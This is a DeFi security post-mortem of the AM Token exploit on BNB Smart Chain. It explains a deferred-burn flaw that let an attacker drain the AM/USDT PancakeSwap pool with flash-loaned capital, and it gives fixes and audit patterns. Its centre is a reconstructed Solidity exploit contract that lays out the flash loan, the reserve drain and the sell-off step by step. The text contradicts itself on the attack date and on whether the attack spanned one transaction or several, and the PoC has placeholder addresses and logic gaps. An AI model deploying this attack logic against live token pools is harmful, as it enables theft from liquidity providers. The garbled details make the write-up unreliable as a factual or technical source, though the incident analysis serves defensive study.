# AM Token Security Incident Analysis
**Business Logic Vulnerability (Deferred Burn Mechanism Abuse) | BSC | 2026-03-11 | Loss: ~$131,000**

---

## 1. Incident Overview

| Field | Details |
|------|------|
| Project | AM Token (AM/USDT PancakeSwap Pool) |
| Chain | BNB Smart Chain (BSC) |
| Date | 2026-03-12 (UTC: Mar-12-2026 12:40:15 AM +UTC) |
| Loss | ~$131,000 (full AM/USDT liquidity pool) |
| Vulnerability Type | Business Logic — Deferred Burn (`toBurnAmount`) Mechanism Flaw |
| Attack Transaction | `0xd0d13179645985eae599c029574e866d79b286fbea395b66504f87f31629f859` ([BscScan](https://bscscan.com/tx/0xd0d13179645985eae599c029574e866d79b286fbea395b66504f87f31629f859)) |
| Attacker Address | `0x0B9a1391269e95162bfeC8785E663258C209333B` ([BscScan](https://bscscan.com/address/0x0B9a1391269e95162bfeC8785E663258C209333B)) |
| Attack Contract | `0x11ab0C24fbc359a585587397D270B5FEd2c85FD4` ([BscScan](https://bscscan.com/address/0x11ab0C24fbc359a585587397D270B5FEd2c85FD4)) |
| Vulnerable Contract | `0x27f9787DbdcA43F92cCC499892a082494c23213f` ([BscScan](https://bscscan.com/address/0x27f9787DbdcA43F92cCC499892a082494c23213f)) |
| Root Cause Summary | AM Token's transfer function uses a `toBurnAmount` state variable that defers burns to the next sell event. The attacker deliberately manipulated this value to drain the AM reserve of the AM/USDT PancakeSwap pair to near-zero, then sold AM at the artificially inflated price to extract USDT. |

---

## 2. Vulnerability Analysis

### 2.1 Deferred Burn (`toBurnAmount`) Mechanism Flaw
**Severity**: CRITICAL
**CWE**: CWE-840 (Business Logic Errors)

The AM Token contract does not burn tokens immediately on a sell transaction. Instead, it records the pending burn amount in a state variable called `toBurnAmount` and performs the actual burn at the **next sell transaction** — a "deferred burn" pattern.

This pattern has two core vulnerabilities.

**First**, the pending burn amount recorded in `toBurnAmount` is not deducted from the seller's balance; instead, it is **burned directly from the AM balance (reserve) of the PancakeSwap pair contract**. In other words, the LP pool bears the cost, not the original seller.

**Second**, the pending burn amount (`toBurnAmount`) carries over the value set by the previous sell transaction. The attacker exploits this by: selling a small amount (→ sets `toBurnAmount` = pending burn amount), then buying a large amount (→ reduces reserve), then sending 6 wei (→ triggers the deferred burn, reserve ≈ 0). This sequence can drain the reserve to near zero.

When the reserve is critically low, the AMM invariant (x × y = k) causes AM's price to skyrocket, and the attacker sells their held AM at this artificially elevated price to extract a large amount of USDT.

This "deferred burn + reserve manipulation" pattern is a vulnerability type observed repeatedly on BSC in early 2026. Similar incidents with the same pattern include: LAXO Token (2026-02-22, ~$137K), Movie Token MT (2026-03-10, ~$242K), and BCE Token (2026-03-23, ~$679K).

#### Vulnerable Code (❌)

```solidity
// AM Token — Deferred Burn Mechanism (Vulnerable Version, Reconstructed)

uint256 public toBurnAmount;  // ❌ Pending burn amount accumulated in state variable

function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    // ❌ Process pending burn amount accumulated from previous transaction first
    if (toBurnAmount > 0 && from != uniswapV2Pair && to != uniswapV2Pair) {
        // ❌ Burn occurs directly from the pair's reserve — not the seller's cost!
        _burn(uniswapV2Pair, toBurnAmount);
        // ❌ sync() call immediately reflects the manipulated reserve
        IUniswapV2Pair(uniswapV2Pair).sync();
        toBurnAmount = 0;
    }

    // Sell detection: if `to` is the pair address, record current sell amount in toBurnAmount
    if (to == uniswapV2Pair && !_isExcludedFromFee[from]) {
        // ❌ Records entire sell amount for "next burn point"
        //    This value is not immediately deducted from the seller's balance
        toBurnAmount = amount * burnRate / 10000;
    }

    super._transfer(from, to, amount);
}
```

#### Safe Code (✅)

```solidity
// AM Token — Immediate Burn + Seller-Borne Cost (Fixed Version)

// ✅ Remove deferred burn state variable — cost is attributed to seller immediately
// uint256 public toBurnAmount;  ← removed

function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    // ✅ Burn immediately on sell transaction (deducted from seller's balance)
    if (to == uniswapV2Pair && !_isExcludedFromFee[from]) {
        uint256 burnAmount = amount * burnRate / 10000;

        // ✅ Burn must always be deducted from the seller (from)
        _burn(from, burnAmount);

        // ✅ Only the net amount (after burn) is forwarded to the pair
        amount -= burnAmount;

        // ✅ Pair reserve is unaffected — cannot be manipulated
    }

    super._transfer(from, to, amount);
}
```

---

## 3. Attack Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│                     AM Token Attack Flow Summary                     │
└─────────────────────────────────────────────────────────────────────┘

Attacker (0x0B9a...333B)
  │
  │ [Preparation]
  ├─[1]─────────────────────────────────────────────────────────────────
  │       Lista DAO flash loan: borrow ~27.3M USDC + ~361K WBNB
  │       Use Venus vWBNB and vUSDT to secure large capital
  │       Final capital secured: ~100.4M USDT
  │
  │ [Step 1: Set toBurnAmount]
  ├─[2]─────────────────────────────────────────────────────────────────
  │       Sell ~5,062 AM tokens into AM/USDT pool
  │       → toBurnAmount = ~4,303 AM is set
  │         (scheduled for burn on next non-swap transfer)
  │
  │ [Step 2: Drain Reserve]
  ├─[3]─────────────────────────────────────────────────────────────────
  │       Buy large amount of AM with USDT
  │       → Pool's AM reserve drops to ~4,303 AM after bulk withdrawal
  │         (nearly equal to toBurnAmount)
  │
  │ [Step 3: Trigger Deferred Burn — Core Attack]
  ├─[4]─────────────────────────────────────────────────────────────────
  │       Transfer 6 wei AM (non-swap internal transfer in attack contract)
  │       → Triggers toBurnAmount execution inside _transfer()
  │       → Burns ~4,303 AM from the pair
  │       → sync() called: pool's AM reserve ≈ 0 (extreme drain!)
  │
  │ [Step 4: Exploit Artificial Price Spike]
  ├─[5]─────────────────────────────────────────────────────────────────
  │       Inject small amount of AM into pool (minimal reserve recovery)
  │       Sell all held AM tokens
  │       → AMM invariant x*y=k: AM reserve ≈ 0 → AM price spikes
  │       → Attacker extracts large amount of USDT at artificial price
  │
  │ [Step 5: Repay and Secure Profit]
  └─[6]─────────────────────────────────────────────────────────────────
          Repay Lista DAO flash loan
          Net profit: ~$131,000 USDT


                    AM/USDT PancakeSwap Pool State Changes
┌──────────────────┐   After sell    ┌──────────────────┐
│  Pre-Attack State │ ──────────────▶ │  toBurnAmount Set │
│ AM reserve: normal│                 │ toBurnAmount=4303 │
│ USDT reserve: norm│                 │ AM reserve: normal│
└──────────────────┘                 └──────────────────┘
                                               │
                                    Bulk buy   │
                                               ▼
┌──────────────────┐  Burn triggered  ┌──────────────────┐
│  Post-Attack State│ ◀──────────────  │ AM Reserve Drop  │
│ USDT: drained    │                  │ AM reserve≈4303  │
│ AM reserve ≈ 0   │                  │ (≈ toBurnAmount) │
└──────────────────┘                  └──────────────────┘
        ▲                                      │
        │                           6 wei xfer │
        │                                      ▼
        │                           ┌──────────────────┐
        └────────────────────────── │ sync() called    │
              Profit realized        │ AM reserve ≈ 0  │
                                    │ AM price spikes! │
                                    └──────────────────┘
```

**Step-by-step explanation**:

1. **Flash Loan**: The attacker borrows approximately 27.3M USDC and 361K WBNB via flash loan from Lista DAO. Using Venus lending protocol (vWBNB, vUSDT), they secure roughly 100.4M USDT equivalent. The large capital is needed to reduce the AM/USDT pool's AM reserve to a level matching `toBurnAmount`.

2. **Set toBurnAmount**: The attacker sells approximately 5,062 AM tokens into the AM/USDT pool. During this sell transaction, `_transfer()` internally sets `toBurnAmount = ~4,303` (after applying the burn rate). This value represents the amount to be burned from the pair at the next non-swap transfer.

3. **Drain Reserve**: The attacker uses the large USDT acquired in the previous step to buy AM. The bulk buy causes the pool's AM reserve to drop sharply, converging to approximately the same level as `toBurnAmount` (~4,303 AM).

4. **Trigger Deferred Burn**: The attacker transfers 6 wei (a dust amount) of AM internally within the attack contract. Since this is a plain `transfer()` call, not a swap, it satisfies the `toBurnAmount` execution condition. At this point, `_burn(uniswapV2Pair, 4303 AM)` executes, draining the pool's AM reserve to near zero. `sync()` is then called to immediately commit the manipulated reserve state to the pool.

5. **Exploit Artificial Price Spike**: Per the AMM invariant `x * y = k`, as the AM reserve approaches zero, AM's unit price approaches infinity. The attacker sells all their held AM at this artificially elevated price, extracting a large amount of USDT.

6. **Repay Flash Loan and Secure Profit**: The flash loan is repaid with fees, and the remaining ~$131,000 is kept as net profit.

---

## 4. PoC Code Analysis

No dedicated PoC for AM Token has been registered in the official DeFiHackLabs repository. The code below is a reconstructed core attack logic based on BlockSec analysis reports and on-chain transaction data.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

/**
 * @title AM Token Exploit PoC (Reconstructed)
 * @notice Reconstructed based on BlockSec analysis and on-chain transaction data
 *
 * @KeyInfo
 * - Total Loss: ~$131,000
 * - Attacker: https://bscscan.com/address/0x0B9a1391269e95162bfeC8785E663258C209333B
 * - Attack Contract: https://bscscan.com/address/0x11ab0C24fbc359a585587397D270B5FEd2c85FD4
 * - Vulnerable Contract: https://bscscan.com/address/0x27f9787DbdcA43F92cCC499892a082494c23213f
 * - Attack Tx: https://bscscan.com/tx/0xd0d13179645985eae599c029574e866d79b286fbea395b66504f87f31629f859
 * - Attack Block: 86066209
 */

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function sync() external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IListaDAO {
    // Lista DAO flash loan interface
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata params) external;
}

interface IVenus {
    function mint(uint mintAmount) external returns (uint);
    function redeem(uint redeemTokens) external returns (uint);
    function borrow(uint borrowAmount) external returns (uint);
    function repayBorrow(uint repayAmount) external returns (uint);
}

contract AMTokenExploit {
    // ─── Key Contract Addresses (BSC) ────────────────────────────────
    address constant AM_TOKEN   = 0x27f9787DbdcA43F92cCC499892a082494c23213f; // ← vulnerable token
    address constant USDT       = 0x55d398326f99059fF775485246999027B3197955; // BSC-USD (Binance-Peg)
    address constant WBNB       = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant AM_USDT_PAIR = 0x...; // AM/USDT PancakeSwap V2 Pair

    address constant LISTA_DAO  = 0x...; // Lista DAO flash loan provider
    address constant VENUS_vWBNB = 0x6bca74586218db34cdb402295796b79663d816e9;
    address constant VENUS_vUSDT = 0xfd5840Cd36d94D7229439859C0112a4185bc0255;

    /**
     * @notice Attack entry point
     */
    function attack() external {
        // [Step 1] Borrow large USDC + WBNB flash loan from Lista DAO
        //          Then secure ~100.4M USDT via Venus
        IListaDAO(LISTA_DAO).flashLoan(
            address(this),
            WBNB,
            361_000e18, // ~361K WBNB
            abi.encode("am_attack")
        );
    }

    /**
     * @notice Lista DAO flash loan callback
     */
    function flashLoanCallback(
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external {
        // [Step 1 cont.] Use WBNB as collateral on Venus to borrow USDT
        IERC20(WBNB).approve(VENUS_vWBNB, type(uint256).max);
        IVenus(VENUS_vWBNB).mint(IERC20(WBNB).balanceOf(address(this)));
        IVenus(VENUS_vUSDT).borrow(100_400_000e18); // borrow ~100.4M USDT

        // ────────────────────────────────────────────────────────────────
        // [Step 2] Sell small amount of AM tokens → set toBurnAmount
        //          Sell ~5,062 AM → toBurnAmount = ~4,303 AM
        // ────────────────────────────────────────────────────────────────
        uint256 smallSellAmount = 5_062e18;
        IERC20(USDT).transfer(AM_USDT_PAIR, /* small USDT */0);
        IUniswapV2Pair(AM_USDT_PAIR).swap(smallSellAmount, 0, address(this), "");
        // → During this swap, AM Token's _transfer() is called,
        //   setting toBurnAmount = 4303 AM

        // ────────────────────────────────────────────────────────────────
        // [Step 3] Buy large amount of AM with USDT → drain pool AM reserve
        //          Pool AM balance drops to ~4,303 AM (matching toBurnAmount)
        // ────────────────────────────────────────────────────────────────
        uint256 bulkUSDT = 50_000_000e18; // large USDT amount
        IERC20(USDT).transfer(AM_USDT_PAIR, bulkUSDT);
        (uint112 r0, uint112 r1,) = IUniswapV2Pair(AM_USDT_PAIR).getReserves();
        // After buy, pool's AM reserve ≈ 4,303 AM (nearly matches toBurnAmount)
        IUniswapV2Pair(AM_USDT_PAIR).swap(
            _calcAmOut(bulkUSDT, r0, r1), 0, address(this), ""
        );

        // ────────────────────────────────────────────────────────────────
        // [Step 4] Transfer 6 wei AM → trigger deferred burn (core attack vector!)
        //          This transfer() is a plain transfer, not a swap,
        //          so it satisfies the toBurnAmount execution condition
        //          → _burn(pair, 4303 AM) + sync() executes
        //          → Pool's AM reserve ≈ 0 (extreme drain!)
        // ────────────────────────────────────────────────────────────────
        IERC20(AM_TOKEN).transfer(address(this), 6); // 6 wei self-transfer
        // Internally, AM Token's _transfer() is called,
        // executing toBurnAmount to burn AM from the pair + call sync()

        // ────────────────────────────────────────────────────────────────
        // [Step 5] Inject small AM into pool then sell all → extract large USDT
        //          AMM x*y=k: AM reserve ≈ 0 → AM price spikes
        //          Sell all held AM at artificially elevated price
        // ────────────────────────────────────────────────────────────────
        uint256 amBalance = IERC20(AM_TOKEN).balanceOf(address(this));
        IERC20(AM_TOKEN).transfer(AM_USDT_PAIR, amBalance);
        (r0, r1,) = IUniswapV2Pair(AM_USDT_PAIR).getReserves();
        // r0(AM) ≈ 0, so getAmountOut returns a very large USDT amount
        uint256 usdtOut = _calcUsdtOut(amBalance, r0, r1);
        IUniswapV2Pair(AM_USDT_PAIR).swap(0, usdtOut, address(this), "");
        // → Extract ~$131,000 USDT

        // ────────────────────────────────────────────────────────────────
        // [Step 6] Repay Venus loan + repay Lista DAO flash loan
        //          Remainder is net profit (~$131,000)
        // ────────────────────────────────────────────────────────────────
        IERC20(USDT).approve(VENUS_vUSDT, type(uint256).max);
        IVenus(VENUS_vUSDT).repayBorrow(100_400_000e18);
        IVenus(VENUS_vWBNB).redeem(type(uint256).max);

        uint256 repay = amount + fee;
        IERC20(WBNB).transfer(LISTA_DAO, repay);
        // Remaining USDT ≈ $131,000 — transferred to attacker wallet
    }

    // Helper functions
    function _calcAmOut(uint256 usdtIn, uint112 rAM, uint112 rUSDT)
        internal pure returns (uint256)
    {
        // PancakeSwap V2 amountOut formula: (amountIn * 997 * reserveOut) / (reserveIn * 1000 + amountIn * 997)
        uint256 amountInWithFee = usdtIn * 997;
        uint256 numerator       = amountInWithFee * uint256(rAM);
        uint256 denominator     = uint256(rUSDT) * 1000 + amountInWithFee;
        return numerator / denominator;
    }

    function _calcUsdtOut(uint256 amIn, uint112 rAM, uint112 rUSDT)
        internal pure returns (uint256)
    {
        uint256 amountInWithFee = amIn * 997;
        uint256 numerator       = amountInWithFee * uint256(rUSDT);
        uint256 denominator     = uint256(rAM) * 1000 + amountInWithFee;
        return numerator / denominator;
    }
}
```

---

## 5. CWE Classification

| CWE ID | Vulnerability Name | Severity | Affected Component |
|--------|---------|--------|-------------|
| CWE-840 | Business Logic Errors | CRITICAL | `toBurnAmount` deferred burn logic in AM Token `_transfer()` function |
| CWE-682 | Incorrect Calculation | HIGH | Burn cost attribution error — deducted from LP pool instead of seller |
| CWE-400 | Uncontrolled Resource Consumption | HIGH | Attacker manipulates `toBurnAmount` to force-drain LP pool token balance |
| CWE-693 | Protection Mechanism Failure | MEDIUM | No protection against flash loan + deferred execution combination |
| CWE-362 | Race Condition | MEDIUM | State variable `toBurnAmount` persists across multiple transactions, creating an exploitable time window |

### V-01: Burn Cost Attribution Error in Deferred Burn Mechanism (CWE-840 / CWE-682)

- **Description**: AM Token adopts a design that accumulates the burn amount in the `toBurnAmount` state variable rather than processing it immediately on sell transactions, then burns directly from the PancakeSwap pair at the next non-swap transfer. In this design, the burn cost should be borne by the seller, but is actually borne by the entire LP pool.

- **Impact**: If the attacker exploits `toBurnAmount` to its maximum effect via the sequence of small sell → large buy → burn trigger, the LP pool's token reserve can be drained to near zero. As the reserve approaches zero, the AMM price formula causes the token price to spike, and the attacker sells pre-purchased tokens at this price to extract hundreds of thousands of dollars.

- **Attack Requirements**: Flash loan capital (large USDT), small AM token holdings (to set `toBurnAmount`), an account capable of non-swap transfers.

### V-02: AMM Price Manipulation via Reserve Drain (CWE-400)

- **Description**: When `toBurnAmount` executes, `_burn(pair, amount)` + `sync()` are called in sequence. The `burn` decreases the pair's `balanceOf`, and `sync()` immediately reflects the reduced balance in the internal reserves. The attacker can use this mechanism to bring the pair's AM reserve to near zero within a single transaction.

- **Impact**: By the AMM invariant `x * y = k`, token price rises inversely proportional to the reserve. Draining the reserve to near zero theoretically allows for an infinite price spike.

- **Attack Requirements**: `toBurnAmount` must have been set by a prior sell transaction.

### V-03: Cross-Transaction Persistence of `toBurnAmount` State Variable (CWE-362)

- **Description**: `toBurnAmount` is set in one transaction and consumed in another. This "deferred execution" structure provides the attacker with a time window between the first transaction (sell) and the second transaction (burn trigger) to manipulate market state.

- **Impact**: Between the first and second transactions, the attacker can perform additional buys to adjust the reserve to a level matching `toBurnAmount`. This allows them to ensure the reserve is exactly zero (or very close) after the burn executes.

- **Attack Requirements**: Multi-transaction attack allowed (not atomic execution).

---

## 6. Reproducibility Assessment

| Item | Assessment |
|------|------|
| Attack Complexity | Medium (requires flash loan composition, multi-protocol interaction) |
| Prior Knowledge Required | Understanding of `toBurnAmount` state variable existence and behavior |
| Capital Requirement | Large (~100M USDT-scale flash loan needed to reduce pool AM reserve to `toBurnAmount` level) |
| Atomicity | Yes — entire attack completable within a single transaction (block 86066209) |
| Ease of Reproduction | Medium — immediately applicable to other BSC tokens using the same design pattern |
| On-chain Verification | Possible — verifiable via Transfer/Sync event ordering in block 86066209 transaction receipt |

This attack exploited a poorly designed token economic mechanism rather than a novel zero-day vulnerability. Any BSC deflationary token using a `toBurnAmount` or `scheduledDestruction` pattern similar to AM Token may be exposed to the same vulnerability.

---

## 7. Remediation

### Immediate Actions

#### 1) Convert Deferred Burn → Immediate Burn

```solidity
// ✅ Fix 1: Completely remove deferred burn — replace with immediate burn
//           Burn cost is always attributed to the seller or sender side

// Remove: uint256 public toBurnAmount;

function _transfer(
    address from,
    address to,
    uint256 amount
) internal virtual override {
    // Sell detection: if to is a DEX pair address
    if (to == uniswapV2Pair && !_isExcludedFromFee[from]) {
        uint256 burnAmount = amount * burnRate / 10000;

        // ✅ Immediate burn: burn must always be deducted from sender (from)
        if (burnAmount > 0) {
            _burn(from, burnAmount);     // immediately deducted from seller balance
            amount -= burnAmount;        // adjust net amount to forward to pair
        }
        // Result:
        //   from.balance  -= amount + burnAmount (full deduction including burn)
        //   pair.balance  += (amount - burnAmount) (only net amount increases)
        //   pair.reserve  is unaffected (no sync)
    }

    super._transfer(from, to, amount);
    // Pair reserve updates normally after swap — cannot be manipulated
}
```

#### 2) Prohibit Direct Burns from Pair Address

```solidity
// ✅ Fix 2: Explicitly exclude pair address from burn targets
function _burn(address account, uint256 amount) internal override {
    // ✅ Cannot burn directly from pair address — protects LP reserve
    require(account != uniswapV2Pair, "AM: cannot burn from pair");
    super._burn(account, amount);
}
```

#### 3) Restrict `sync()` Calls

```solidity
// ✅ Fix 3: Prohibit pair.sync() calls inside regular transfer
//           sync() should only be called during liquidity add/remove
// → Remove all code that directly calls pair.sync() inside _transfer
```

### Long-Term Improvements

| Vulnerability | Recommended Action | Priority |
|--------|-----------|---------|
| Deferred burn mechanism | Completely remove at design stage — replace with immediate burn | CRITICAL |
| LP reserve protection | Prohibit all patterns in token contracts that directly access DEX pair reserves | HIGH |
| State variable persistence | Do not manage pending burn amounts as global variables across transactions | HIGH |
| Flash loan protection | Add pause logic triggered on detection of large capital movements within the same block | MEDIUM |
| Audit | Conduct deflationary mechanism-specialized security audit prior to launch | HIGH |
| Monitoring | Integrate on-chain monitoring systems such as BlockSec Phalcon | MEDIUM |
| Liquidity management | Implement automatic pause when pool reserve drops abnormally low | MEDIUM |

---

## 8. Lessons Learned

### 8.1 Recurring BSC Deflationary Token Pattern

This incident is part of a series of same-pattern attacks that occurred on BSC within a 6-week span in early 2026:

| Date | Project | Loss | Similar Mechanism |
|------|---------|------|--------------|
| 2026-02-22 | LAXO Token | ~$137K | Double-increase of pair balance on burn + sync() |
| 2026-03-10 | Movie Token (MT) | ~$242K | Pending burn LP mechanism |
| 2026-03-11 | AM Token | ~$131K | `toBurnAmount` deferred burn |
| 2026-03-23 | BCE Token | ~$679K | `scheduledDestruction` + direct pair burn |

All share the same design flaw: **burn cost is deducted from the LP pool**. This is not an isolated bug — it represents a **repeated mistake at the level of the deflationary token design paradigm**.

### 8.2 Design Principle Violation

All deflationary/burn mechanisms must adhere to the following invariant:

> **The burn cost must be borne by the party that triggered the action (seller/sender). Deducting directly from the LP pool's reserves must never be used under any circumstances.**

AM Token's `toBurnAmount` design violated this principle, creating a structure that transferred the burn cost to the entire LP pool rather than to the seller. This allowed the attacker to drain the LP's entire reserve with minimal capital.

### 8.3 Dangers of Deferred Execution

The "deferred execution" pattern — storing logic scheduled for future execution in a state variable — is especially dangerous in smart contracts. Deferred execution:

- Grants the attacker time to manipulate state before execution occurs.
- Allows the attacker to control when the deferred execution is triggered.
- Makes single-transaction atomicity guarantees difficult.

In particular, deferred execution with financial consequences (burns, distributions, etc.) should be replaced with atomic execution wherever possible.

### 8.4 Detecting Similar Patterns

BSC token contracts containing the following code patterns are likely to have the same vulnerability:

```solidity
// ⚠️  Dangerous pattern — flag immediately during audit
uint256 public toBurnAmount;          // global pending burn amount
_burn(uniswapV2Pair, someAmount);     // direct burn from pair
IUniswapV2Pair(pair).sync();          // sync() called inside transfer
scheduledDestruction += amount;       // pending burn amount accumulation
pendingBurn = amount;                 // deferred burn state variable
```

When these patterns are found during a security audit, classify as a vulnerability immediately and verify the burn cost attribution subject explicitly.

### 8.5 Lowering Barrier to Flash Loan Combination Attacks

In this incident, the attacker combined multiple BSC DeFi protocols — Lista DAO, Venus, and PancakeSwap — to secure over 100M USDT in a single transaction with virtually no upfront capital. This demonstrates that large-scale reserve manipulation is possible even with near-zero initial capital.

**All BSC deflationary tokens require security design that assumes an "infinite-capital attacker."**

### 8.6 Importance of On-Chain Monitoring

This attack was detected in real time by BlockSec Phalcon. However, funds had already been stolen by the time detection occurred. The fact that this was post-detection rather than pre-emptive monitoring once again underscores the importance of protocol-level automatic circuit breaker mechanisms.

---

## References

- [BlockSec Weekly Security Roundup | Mar 9–15, 2026](https://blocksec.com/blog/weekly-web3-security-incident-roundup-mar-9-mar-15-2026)
- [BlockSec: AM/USDT BSC Attack, ~$131,000 Loss](https://www.bitget.com/news/detail/12560605258888)
- [BscScan — AM Token Contract](https://bscscan.com/address/0x27f9787DbdcA43F92cCC499892a082494c23213f)
- [BscScan — Attack Transaction](https://bscscan.com/tx/0xd0d13179645985eae599c029574e866d79b286fbea395b66504f87f31629f859)
- [BscScan — Attacker Address](https://bscscan.com/address/0x0B9a1391269e95162bfeC8785E663258C209333B)
- [Similar Case: LAXO Token (2026-02-22)](./2026-02-22_LAXOToken_ReserveManipulation.md)
- [Similar Case: BCE Token (2026-03-23)](./2026-03-23_BCEToken_BusinessLogic_BSC.md)
- [Similar Case: Movie Token MT (2026-03-10)](./2026-03-10_MovieToken_MT_PendingBurnLP_BSC.md)